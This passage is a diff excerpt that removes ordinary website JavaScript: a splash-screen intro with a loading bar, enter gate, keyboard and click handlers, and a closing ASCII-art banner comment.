-  loadPct.textContent = '0%';
-  enterEl.classList.remove('done');
-  const t0 = performance.now();
-  const step = now => {
-    const p = Math.min(1, (now - t0) / BUILD_MS);
-    loadFill.style.transform = 'scaleX(' + p.toFixed(3) + ')';
-    loadPct.textContent = Math.round(p * 100) + '%';
-    if(p < 1){ requestAnimationFrame(step); return; }
-    enterEl.classList.add('done');
-  };
-  requestAnimationFrame(step);
-}
-
-function holdSplash(){
-  if(entered || building) return;
-  enterEl.classList.add('held');
-  setTimeout(() => { if(splashArt) splashArt.style.visibility = 'hidden'; }, 1000);
-}
-
-function openGate(){
-  if(gateOpen || entered) return;
-  gateOpen = true;
-  enterEl.classList.add('ready');
-  enterEl.setAttribute('aria-label', 'Enter');
-}
-
-function skipIntro(){
-  enterEl.classList.add('no-video');
-  showArt();
-  openGate();
-}
-
-function beginBuild(){
-  if(entered || building || !gateOpen) return;
-  building = true;
-  enterEl.classList.add('build');
-  showArt();
-  if(reduceMotion){ enterSite(); return; }
-  setTimeout(enterSite, 2600);
-}
-
-function startSplash(){
-  if(reduceMotion || !splashArt){ skipIntro(); return; }
-  let armed = false;
-  const arm = () => {
-    if(armed) return;
-    armed = true;
-    setTimeout(holdSplash, SPLASH_MS);
-    setTimeout(openGate, SPLASH_MS);
-  };
-  splashArt.addEventListener('error', skipIntro, { once: true });
-  const watch = () => {
-    if(armed || gateOpen) return;
-    if(splashArt.complete){
-      if(splashArt.naturalWidth) arm();
-      else skipIntro();
-      return;
-    }
-    setTimeout(watch, 80);
-  };
-  watch();
-  setTimeout(openGate, SPLASH_MS + 2500);
-}
-
-enterEl.addEventListener('click', beginBuild);
-document.addEventListener('keydown', e => {
-  if(!entered && (e.key === 'Enter' || e.key === ' ')){ e.preventDefault(); beginBuild(); }
-});
-rosterEl.addEventListener('click', e => {
-  const btn = e.target.closest('.m');
-  if(btn && document.body.classList.contains('in')) openProfile(BYID[btn.dataset.id]);
-});
-
-startSplash();
-startPresence();
-})();
-
-//                             ..    .          ..                            
-//                       x .d88"    @88>  . uW8"                              
-//                        5888R     %8P   `t888                     .u    .   
-//       .         u      '888R      .     8888   .        .u     .d88B :@8c  
-//  .udR88N     us888u.    888R    .@88u   9888.z88N    ud8888.  ="8888f8888r 
-// <888'888k .@88 "8888"   888R   ''888E`  9888  888E :888'8888.   4888>'88"  
-// 9888 'Y"  9888  9888    888R     888E   9888  888E d888 '88%"   4888> '    
-// 9888      9888  9888    888R     888E   9888  888E 8888.+"      4888>      
-// 9888      9888  9888    888R     888E   9888  888E 8888L       .d888L .+   
-// ?8888u../ 9888  9888   .888B .   888&  .8888  888" '8888c. .+  ^"8888*"    
-//  "8888P'  "888*""888"  ^*888%    R888"  `%888*%"    "88888%       "Y"      
-//    "P'     ^Y"   ^Y'     "%       ""       "`         "YP'                 
-                                                                        
